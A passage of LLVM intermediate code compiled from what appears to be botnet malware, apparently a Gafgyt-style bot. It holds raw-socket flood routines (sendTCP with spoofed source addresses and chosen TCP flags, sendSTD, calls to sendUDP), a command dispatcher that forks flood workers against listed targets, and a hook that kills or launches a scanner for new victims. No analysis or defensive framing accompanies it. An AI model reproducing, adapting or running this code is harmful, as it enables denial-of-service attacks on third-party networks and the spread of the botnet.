  %139 = trunc i32 %1 to i16
  %140 = mul nsw i32 %7, 1000
  br label %.outer72

.outer72:                                         ; preds = %.outer72.backedge, %114
  %.066.ph = phi i32 [ 0, %114 ], [ %165, %.outer72.backedge ]
  %.0.ph = phi i32 [ 0, %114 ], [ %.0.ph.be, %.outer72.backedge ]
  br label %141

; <label>:141:                                    ; preds = %.outer72, %161
  %.066 = phi i32 [ 0, %161 ], [ %.066.ph, %.outer72 ]
  %142 = call i64 @sendto(i32 %65, i8* nonnull %92, i64 %90, i32 0, %struct.sockaddr* nonnull %133, i32 16) #6
  %143 = call i32 @rand_cmwc()
  %144 = trunc i32 %143 to i16
  store i16 %144, i16* %107, align 4
  br i1 %12, label %145, label %147

; <label>:145:                                    ; preds = %141
  %146 = call i32 @rand_cmwc()
  br label %150

; <label>:147:                                    ; preds = %141
  %148 = call zeroext i16 @htons(i16 zeroext %139) #15
  %149 = zext i16 %148 to i32
  br label %150

; <label>:150:                                    ; preds = %147, %145
  %151 = phi i32 [ %146, %145 ], [ %149, %147 ]
  %152 = trunc i32 %151 to i16
  store i16 %152, i16* %118, align 2
  %153 = call i32 @rand_cmwc()
  %154 = trunc i32 %153 to i16
  store i16 %154, i16* %135, align 4
  %155 = call i32 @GRIP(i32 %.070)
  %156 = call i32 @htonl(i32 %155) #15
  store i32 %156, i32* %137, align 4
  %157 = load i16, i16* %124, align 2
  %158 = zext i16 %157 to i32
  %159 = call zeroext i16 @csum(i16* nonnull %122, i32 %158)
  store i16 %159, i16* %129, align 2
  %160 = icmp eq i32 %.066, %5
  br i1 %160, label %161, label %164

; <label>:161:                                    ; preds = %150
  %162 = call i64 @time(i64* null) #6
  %163 = icmp sgt i64 %162, %138
  br i1 %163, label %171, label %141

; <label>:164:                                    ; preds = %150
  %165 = add i32 %.066, 1
  %166 = icmp eq i32 %.0.ph, %6
  br i1 %166, label %167, label %169

; <label>:167:                                    ; preds = %164
  %168 = call i32 @usleep(i32 %140) #6
  br label %.outer72.backedge

.outer72.backedge:                                ; preds = %167, %169
  %.0.ph.be = phi i32 [ 0, %167 ], [ %170, %169 ]
  br label %.outer72

; <label>:169:                                    ; preds = %164
  %170 = add i32 %.0.ph, 1
  br label %.outer72.backedge

; <label>:171:                                    ; preds = %161
  call void @llvm.stackrestore(i8* %91)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %54
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %19, %34, %171, %74, %67, %31
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #5

declare i32 @usleep(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #15
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %165

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #6
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @switchCommStock, align 4
  %30 = tail call i32 (i32, i8*, ...) @botnetPrint(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i64 0, i64 0))
  br label %165

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #6
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @switchCommStock, align 4
  %37 = call i32 (i32, i8*, ...) @botnetPrint(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.115, i64 0, i64 0))
  br label %165

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @GRIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #15
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.116, i64 0, i64 0)) #14
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i64 0, i64 0)) #6
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.118, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i64 0, i64 0)) #6
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i64 0, i64 0)) #14
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i64 0, i64 0)) #14
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i64 0, i64 0)) #14
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @switchCommStock, align 4
  %108 = call i32 (i32, i8*, ...) @botnetPrint(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.123, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #15
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i64 @time(i64* null) #6
  %138 = zext i32 %2 to i64
  %139 = add i64 %137, %138
  %140 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %141 = getelementptr inbounds i8, i8* %45, i64 12
  %142 = bitcast i8* %141 to i32*
  %143 = getelementptr inbounds i8, i8* %45, i64 4
  %144 = bitcast i8* %143 to i16*
  %sext = shl i64 %139, 32
  %145 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %146 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %140, i32 16) #6
  %147 = call i32 @GRIP(i32 %.065)
  %148 = call i32 @htonl(i32 %147) #15
  store i32 %148, i32* %142, align 4
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  store i16 %150, i16* %144, align 4
  %151 = call i32 @rand_cmwc()
  store i32 %151, i32* %59, align 8
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  store i16 %153, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %154 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %154, i16* %114, align 4
  %155 = load i16, i16* %131, align 2
  %156 = zext i16 %155 to i32
  %157 = call zeroext i16 @csum(i16* nonnull %129, i32 %156)
  store i16 %157, i16* %136, align 2
  %158 = icmp eq i32 %.0, %6
  br i1 %158, label %159, label %162

; <label>:159:                                    ; preds = %.backedge
  %160 = call i64 @time(i64* null) #6
  %161 = icmp sgt i64 %160, %145
  br i1 %161, label %164, label %.backedge.backedge

; <label>:162:                                    ; preds = %.backedge
  %163 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %162, %159
  %.0.be = phi i32 [ %163, %162 ], [ 0, %159 ]
  br label %.backedge

; <label>:164:                                    ; preds = %159
  call void @llvm.stackrestore(i8* %44)
  br label %165

; <label>:165:                                    ; preds = %18, %164, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #8

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #11 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca [1 x i8*], align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #6
  %7 = tail call i64 @time(i64* null) #6
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #6
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #6
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast [1 x i8*]* %5 to i8*
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %26 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %27 = sext i32 %2 to i64
  %28 = add nsw i64 %7, %27
  br label %29

; <label>:29:                                     ; preds = %38, %3
  %.0 = phi i32 [ 0, %3 ], [ %39, %38 ]
  store i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.124, i64 0, i64 0), i8** %25, align 8
  %30 = icmp ugt i32 %.0, 49
  br i1 %30, label %31, label %38

; <label>:31:                                     ; preds = %29
  %32 = call i64 @send(i32 %6, i8* nonnull %24, i64 1460, i32 0) #6
  %33 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %26, i32 16) #6
  %34 = call i64 @time(i64* null) #6
  %35 = icmp slt i64 %34, %28
  br i1 %35, label %38, label %36

; <label>:36:                                     ; preds = %31
  %37 = call i32 @close(i32 %6) #6
  call void @_exit(i32 0) #16
  unreachable

; <label>:38:                                     ; preds = %31, %29
  %.1 = phi i32 [ %.0, %29 ], [ 0, %31 ]
  %39 = add i32 %.1, 1
  br label %29
}

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %28

; <label>:6:                                      ; preds = %2
  %7 = getelementptr inbounds i8*, i8** %1, i64 1
  %8 = load i8*, i8** %7, align 8
  %9 = tail call i32 @strcmp(i8* %8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i64 0, i64 0)) #14
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %16

; <label>:11:                                     ; preds = %6
  %12 = load i32, i32* @botnetPid, align 4
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %.loopexit, label %14

; <label>:14:                                     ; preds = %11
  %15 = tail call i32 @kill(i32 %12, i32 9) #6
  store i32 0, i32* @botnetPid, align 4
  br label %16

; <label>:16:                                     ; preds = %6, %14
  %17 = load i8*, i8** %7, align 8
  %18 = tail call i32 @strcmp(i8* %17, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i64 0, i64 0)) #14
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %28

; <label>:20:                                     ; preds = %16
  %21 = load i32, i32* @botnetPid, align 4
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %.loopexit

; <label>:23:                                     ; preds = %20
  %24 = tail call i32 @fork() #6
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %27, label %26

; <label>:26:                                     ; preds = %23
  store i32 %24, i32* @botnetPid, align 4
  br label %.loopexit

; <label>:27:                                     ; preds = %23
  tail call void @botnetTScan(i32 10, i32 1000)
  unreachable

; <label>:28:                                     ; preds = %16, %2
  %29 = load i8*, i8** %1, align 8
  %30 = tail call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.128, i64 0, i64 0)) #14
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %104

; <label>:32:                                     ; preds = %28
  %33 = icmp slt i32 %0, 6
  br i1 %33, label %.loopexit, label %34

; <label>:34:                                     ; preds = %32
  %35 = getelementptr inbounds i8*, i8** %1, i64 3
  %36 = load i8*, i8** %35, align 8
  %37 = tail call i32 @atoi(i8* %36) #14
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  %40 = getelementptr inbounds i8*, i8** %1, i64 2
  %41 = load i8*, i8** %40, align 8
  %42 = tail call i32 @atoi(i8* %41) #14
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %.loopexit, label %44

; <label>:44:                                     ; preds = %39
  %45 = getelementptr inbounds i8*, i8** %1, i64 4
  %46 = load i8*, i8** %45, align 8
  %47 = tail call i32 @atoi(i8* %46) #14
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %.loopexit, label %49

; <label>:49:                                     ; preds = %44
  %50 = getelementptr inbounds i8*, i8** %1, i64 5
  %51 = load i8*, i8** %50, align 8
  %52 = tail call i32 @atoi(i8* %51) #14
  %53 = icmp eq i32 %52, -1
  %54 = icmp sgt i32 %52, 65500
  %55 = or i1 %54, %53
  %56 = icmp sgt i32 %47, 32
  %or.cond123 = or i1 %56, %55
  br i1 %or.cond123, label %.loopexit, label %57

; <label>:57:                                     ; preds = %49
  %58 = icmp eq i32 %0, 7
  br i1 %58, label %59, label %64

; <label>:59:                                     ; preds = %57
  %60 = getelementptr inbounds i8*, i8** %1, i64 6
  %61 = load i8*, i8** %60, align 8
  %62 = tail call i32 @atoi(i8* %61) #14
  %63 = icmp slt i32 %62, 1
  br i1 %63, label %.loopexit, label %64

; <label>:64:                                     ; preds = %59, %57
  %65 = getelementptr inbounds i8*, i8** %1, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = load i8*, i8** %40, align 8
  %68 = tail call i32 @atoi(i8* %67) #14
  %69 = load i8*, i8** %35, align 8
  %70 = tail call i32 @atoi(i8* %69) #14
  %71 = load i8*, i8** %45, align 8
  %72 = tail call i32 @atoi(i8* %71) #14
  %73 = load i8*, i8** %50, align 8
  %74 = tail call i32 @atoi(i8* %73) #14
  %75 = icmp sgt i32 %0, 6
  br i1 %75, label %76, label %.thread127

; <label>:76:                                     ; preds = %64
  %77 = getelementptr inbounds i8*, i8** %1, i64 6
  %78 = load i8*, i8** %77, align 8
  %79 = tail call i32 @atoi(i8* %78) #14
  %80 = icmp eq i32 %0, 7
  br i1 %80, label %.thread127, label %81

; <label>:81:                                     ; preds = %76
  %82 = getelementptr inbounds i8*, i8** %1, i64 7
  %83 = load i8*, i8** %82, align 8
  %84 = tail call i32 @atoi(i8* %83) #14
  %85 = icmp sgt i32 %0, 8
  br i1 %85, label %86, label %.thread127

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds i8*, i8** %1, i64 8
  %88 = load i8*, i8** %87, align 8
  %89 = tail call i32 @atoi(i8* %88) #14
  br label %.thread127

.thread127:                                       ; preds = %76, %64, %81, %86
  %90 = phi i32 [ %84, %86 ], [ %84, %81 ], [ 1000000, %76 ], [ 1000000, %64 ]
  %91 = phi i32 [ %79, %86 ], [ %79, %81 ], [ %79, %76 ], [ 1000, %64 ]
  %92 = phi i32 [ %89, %86 ], [ 0, %81 ], [ 0, %76 ], [ 0, %64 ]
  %strchr = tail call i8* @strchr(i8* %66, i32 44)
  %93 = icmp eq i8* %strchr, null
  br i1 %93, label %100, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.thread127
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %96
  %.sink = phi i8* [ null, %96 ], [ %66, %.preheader.preheader ]
  %94 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i64 0, i64 0)) #6
  %95 = icmp eq i8* %94, null
  br i1 %95, label %.loopexit.loopexit, label %96

; <label>:96:                                     ; preds = %.preheader
  %97 = tail call i32 @listFork()
  %98 = icmp eq i32 %97, 0
  br i1 %98, label %99, label %.preheader

; <label>:99:                                     ; preds = %96
  tail call void @sendUDP(i8* nonnull %94, i32 %68, i32 %70, i32 %72, i32 %74, i32 %91, i32 %90, i32 %92)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:100:                                    ; preds = %.thread127
  %101 = tail call i32 @listFork()
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %.loopexit

; <label>:103:                                    ; preds = %100
  tail call void @sendUDP(i8* %66, i32 %68, i32 %70, i32 %72, i32 %74, i32 %91, i32 %90, i32 %92)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:104:                                    ; preds = %28
  %105 = tail call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.129, i64 0, i64 0)) #14
  %106 = icmp eq i32 %105, 0
  br i1 %106, label %107, label %.loopexit134

; <label>:107:                                    ; preds = %104
  %108 = icmp slt i32 %0, 6
  br i1 %108, label %.loopexit, label %109

; <label>:109:                                    ; preds = %107
  %110 = getelementptr inbounds i8*, i8** %1, i64 3
  %111 = load i8*, i8** %110, align 8
  %112 = tail call i32 @atoi(i8* %111) #14
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %.loopexit, label %114

; <label>:114:                                    ; preds = %109
  %115 = getelementptr inbounds i8*, i8** %1, i64 2
  %116 = load i8*, i8** %115, align 8
  %117 = tail call i32 @atoi(i8* %116) #14
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %.loopexit, label %119

; <label>:119:                                    ; preds = %114
  %120 = getelementptr inbounds i8*, i8** %1, i64 4
  %121 = load i8*, i8** %120, align 8
  %122 = tail call i32 @atoi(i8* %121) #14
  %123 = icmp eq i32 %122, -1
  %124 = icmp sgt i32 %122, 32
  %or.cond124 = or i1 %123, %124
  br i1 %or.cond124, label %.loopexit, label %125

; <label>:125:                                    ; preds = %119
  %126 = icmp sgt i32 %0, 6
  br i1 %126, label %127, label %.thread128

; <label>:127:                                    ; preds = %125
  %128 = getelementptr inbounds i8*, i8** %1, i64 6
  %129 = load i8*, i8** %128, align 8
  %130 = tail call i32 @atoi(i8* %129) #14
  %131 = icmp slt i32 %130, 0
  br i1 %131, label %.loopexit, label %132

; <label>:132:                                    ; preds = %127
  %133 = icmp eq i32 %0, 8
  br i1 %133, label %134, label %.thread128

; <label>:134:                                    ; preds = %132
  %135 = getelementptr inbounds i8*, i8** %1, i64 7
  %136 = load i8*, i8** %135, align 8
  %137 = tail call i32 @atoi(i8* %136) #14
  %138 = icmp slt i32 %137, 1
  br i1 %138, label %.loopexit, label %.thread128

.thread128:                                       ; preds = %125, %134, %132
  %139 = phi i1 [ true, %134 ], [ false, %132 ], [ false, %125 ]
  %140 = getelementptr inbounds i8*, i8** %1, i64 1
  %141 = load i8*, i8** %140, align 8
  %142 = load i8*, i8** %115, align 8
  %143 = tail call i32 @atoi(i8* %142) #14
  %144 = load i8*, i8** %110, align 8
  %145 = tail call i32 @atoi(i8* %144) #14
  %146 = load i8*, i8** %120, align 8
  %147 = tail call i32 @atoi(i8* %146) #14
  %148 = getelementptr inbounds i8*, i8** %1, i64 5
  %149 = load i8*, i8** %148, align 8
  br i1 %139, label %150, label %154

; <label>:150:                                    ; preds = %.thread128
  %151 = getelementptr inbounds i8*, i8** %1, i64 7
  %152 = load i8*, i8** %151, align 8
  %153 = tail call i32 @atoi(i8* %152) #14
  br label %154

; <label>:154:                                    ; preds = %.thread128, %150
  %155 = phi i32 [ %153, %150 ], [ 10, %.thread128 ]
  br i1 %126, label %156, label %160

; <label>:156:                                    ; preds = %154
  %157 = getelementptr inbounds i8*, i8** %1, i64 6
  %158 = load i8*, i8** %157, align 8
  %159 = tail call i32 @atoi(i8* %158) #14
  br label %160

; <label>:160:                                    ; preds = %154, %156
  %161 = phi i32 [ %159, %156 ], [ 0, %154 ]
  %strchr120 = tail call i8* @strchr(i8* %141, i32 44)
  %162 = icmp eq i8* %strchr120, null
  br i1 %162, label %169, label %.preheader133.preheader

.preheader133.preheader:                          ; preds = %160
  br label %.preheader133

.preheader133:                                    ; preds = %.preheader133.preheader, %165
  %.sink125 = phi i8* [ null, %165 ], [ %141, %.preheader133.preheader ]
  %163 = tail call i8* @strtok(i8* %.sink125, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i64 0, i64 0)) #6
  %164 = icmp eq i8* %163, null
  br i1 %164, label %.loopexit134.loopexit, label %165

; <label>:165:                                    ; preds = %.preheader133
  %166 = tail call i32 @listFork()
  %167 = icmp eq i32 %166, 0
  br i1 %167, label %168, label %.preheader133

; <label>:168:                                    ; preds = %165
  tail call void @sendTCP(i8* nonnull %163, i32 %143, i32 %145, i32 %147, i8* %149, i32 %161, i32 %155)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:169:                                    ; preds = %160
  %170 = tail call i32 @listFork()
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %.loopexit134

; <label>:172:                                    ; preds = %169
  tail call void @sendTCP(i8* %141, i32 %143, i32 %145, i32 %147, i8* %149, i32 %161, i32 %155)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit134.loopexit:                            ; preds = %.preheader133
  br label %.loopexit134

.loopexit134:                                     ; preds = %.loopexit134.loopexit, %169, %104
  %173 = load i8*, i8** %1, align 8
  %174 = tail call i32 @strcmp(i8* %173, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.130, i64 0, i64 0)) #14
  %175 = icmp eq i32 %174, 0
  br i1 %175, label %176, label %206

; <label>:176:                                    ; preds = %.loopexit134
  %177 = icmp slt i32 %0, 6
  br i1 %177, label %.loopexit, label %178

; <label>:178:                                    ; preds = %176
  %179 = getelementptr inbounds i8*, i8** %1, i64 3
  %180 = load i8*, i8** %179, align 8
  %181 = tail call i32 @atoi(i8* %180) #14
  %182 = icmp slt i32 %181, 1
  br i1 %182, label %.loopexit, label %183

; <label>:183:                                    ; preds = %178
  %184 = getelementptr inbounds i8*, i8** %1, i64 5
  %185 = load i8*, i8** %184, align 8
  %186 = tail call i32 @atoi(i8* %185) #14
  %187 = icmp slt i32 %186, 1
  br i1 %187, label %.loopexit, label %188

; <label>:188:                                    ; preds = %183
  %189 = tail call i32 @listFork()
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %191, label %.loopexit

; <label>:191:                                    ; preds = %188
  %192 = getelementptr inbounds i8*, i8** %1, i64 1
  %193 = load i8*, i8** %192, align 8
  %194 = getelementptr inbounds i8*, i8** %1, i64 2
  %195 = load i8*, i8** %194, align 8
  %196 = load i8*, i8** %179, align 8
  %197 = tail call i32 @atoi(i8* %196) #14
  %198 = trunc i32 %197 to i16
  %199 = getelementptr inbounds i8*, i8** %1, i64 4
  %200 = load i8*, i8** %199, align 8
